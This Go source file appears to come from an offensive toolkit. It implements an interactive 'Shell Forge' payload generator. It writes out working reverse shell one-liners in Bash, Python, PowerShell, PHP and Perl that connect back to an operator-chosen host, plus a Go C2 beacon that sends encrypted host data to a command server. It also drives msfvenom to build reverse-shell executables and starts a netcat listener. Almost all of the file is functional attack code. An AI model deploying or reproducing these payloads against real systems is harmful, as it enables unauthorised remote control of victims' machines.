package payloads

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/bryanparreira/davoid/internal/modules/ui"
)

type shellTemplate struct {
	name     string
	lang     string
	generate func(lhost, lport string) string
}

var templates = []shellTemplate{
	{
		name: "Bash TCP Reverse Shell",
		lang: "bash",
		generate: func(lhost, lport string) string {
			return fmt.Sprintf(`bash -i >& /dev/tcp/%s/%s 0>&1`, lhost, lport)
		},
	},
	{
		name: "Python3 Reverse Shell",
		lang: "python",
		generate: func(lhost, lport string) string {
			return fmt.Sprintf(`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, lhost, lport)
		},
	},
	{
		name: "PowerShell Reverse Shell",
		lang: "powershell",
		generate: func(lhost, lport string) string {
			return fmt.Sprintf(`$client=New-Object System.Net.Sockets.TCPClient('%s',%s);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendbyte=([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`, lhost, lport)
		},
	},
	{
		name: "PHP Reverse Shell",
		lang: "php",
		generate: func(lhost, lport string) string {
			return fmt.Sprintf(`<?php $sock=fsockopen("%s",%s);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);?>`, lhost, lport)
		},
	},
	{
		name: "Perl Reverse Shell",
		lang: "perl",
		generate: func(lhost, lport string) string {
			return fmt.Sprintf(`perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, lhost, lport)
		},
	},
	{
		name: "GhostHub Beacon (Go)",
		lang: "go",
		generate: func(lhost, lport string) string {
			return fmt.Sprintf(`// Build: go run beacon.go
// Paste into beacon.go and run
package main
import (
	"bytes"; "crypto/aes"; "crypto/cipher"; "crypto/rand"; "encoding/base64"
	"encoding/json"; "net/http"; "os"; "os/exec"; "runtime"; "time"
)
const C2 = "http://%s:%s"
func main() {
	id := hostname()
	for {
		data, _ := json.Marshal(map[string]string{"id": id, "hostname": id, "os": runtime.GOOS})
		enc, _ := aesEncrypt(data)
		resp, err := http.Post(C2+"/beacon", "text/plain", bytes.NewReader([]byte(enc)))
		if err == nil {
			// ... handle response
			resp.Body.Close()
		}
		time.Sleep(5 * time.Second)
	}
}
func hostname() string { h, _ := os.Hostname(); return h }
func aesEncrypt(data []byte) (string, error) {
	key := make([]byte, 32) // load from ghosthub.key
	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	ct := gcm.Seal(nonce, nonce, data, nil)
	return base64.StdEncoding.EncodeToString(ct), nil
}
func run(cmd string) string {
	out, _ := exec.Command("sh", "-c", cmd).Output()
	return string(out)
}`, lhost, lport)
		},
	},
}

func Run() error {
	ui.Header("Shell Forge — Polymorphic Payload Generator")

	lhost := ui.PromptDefault("LHOST (your IP)", getLocalIP())
	lport := ui.PromptDefault("LPORT", "4444")

	names := make([]string, len(templates))
	for i, t := range templates {
		names[i] = fmt.Sprintf("%-35s [%s]", t.name, t.lang)
	}
	names = append(names, "Msfvenom Payload (requires metasploit)")

	idx := ui.Select("Payload Type", names)
	if idx < 0 {
		return nil
	}

	var payload string
	var ext string

	if idx == len(templates) {
		// msfvenom
		payload, ext = generateMsfvenom(lhost, lport)
	} else {
		t := templates[idx]
		payload = t.generate(lhost, lport)
		ext = langExt(t.lang)
	}

	fmt.Println()
	ui.Divider()
	ui.Info("Generated Payload:")
	ui.Divider()
	fmt.Println()
	fmt.Println(payload)
	fmt.Println()
	ui.Divider()

	outFile := fmt.Sprintf("payloads/shell_%d.%s", time.Now().Unix(), ext)
	os.MkdirAll("payloads", 0700)
	os.WriteFile(outFile, []byte(payload), 0700)
	ui.Success(fmt.Sprintf("Saved to: %s", outFile))

	if ui.Confirm("Start netcat listener now?") {
		ui.Info(fmt.Sprintf("Listening on port %s (Ctrl+C to stop)...", lport))
		cmd := exec.Command("nc", "-lvnp", lport)
		cmd.Stdin = os.Stdin
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Run()
	}

	ui.PressEnter()
	return nil
}

func generateMsfvenom(lhost, lport string) (string, string) {
	if _, err := exec.LookPath("msfvenom"); err != nil {
		ui.Fail("msfvenom not found. Install Metasploit Framework.")
		return "# msfvenom not available", "txt"
	}

	opts := []string{
		"linux/x86/shell_reverse_tcp  (ELF binary)",
		"windows/x64/shell_reverse_tcp (EXE binary)",
		"osx/x86/shell_reverse_tcp    (Mach-O binary)",
		"php/reverse_php              (PHP web shell)",
	}
	payloadMap := []string{
		"linux/x86/shell_reverse_tcp",
		"windows/x64/shell_reverse_tcp",
		"osx/x86/shell_reverse_tcp",
		"php/reverse_php",
	}
	extMap := []string{"elf", "exe", "macho", "php"}
	fmtMap := []string{"elf", "exe", "macho", "raw"}

	pidx := ui.Select("MSF Payload", opts)
	if pidx < 0 {
		return "", "txt"
	}

	outFile := fmt.Sprintf("payloads/msf_%d.%s", time.Now().Unix(), extMap[pidx])
	os.MkdirAll("payloads", 0700)

	args := []string{
		"-p", payloadMap[pidx],
		"LHOST=" + lhost,
		"LPORT=" + lport,
		"-f", fmtMap[pidx],
		"-o", outFile,
	}
	ui.Info("Running msfvenom...")
	cmd := exec.Command("msfvenom", args...)
	if err := cmd.Run(); err != nil {
		ui.Fail(fmt.Sprintf("msfvenom error: %v", err))
		return "", "txt"
	}
	ui.Success(fmt.Sprintf("Saved: %s", outFile))
	return fmt.Sprintf("msfvenom %s", strings.Join(args, " ")), extMap[pidx]
}

func langExt(lang string) string {
	m := map[string]string{
		"bash": "sh", "python": "py", "powershell": "ps1",
		"php": "php", "perl": "pl", "go": "go",
	}
	if e, ok := m[lang]; ok {
		return e
	}
	return "txt"
}

func getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "127.0.0.1"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}
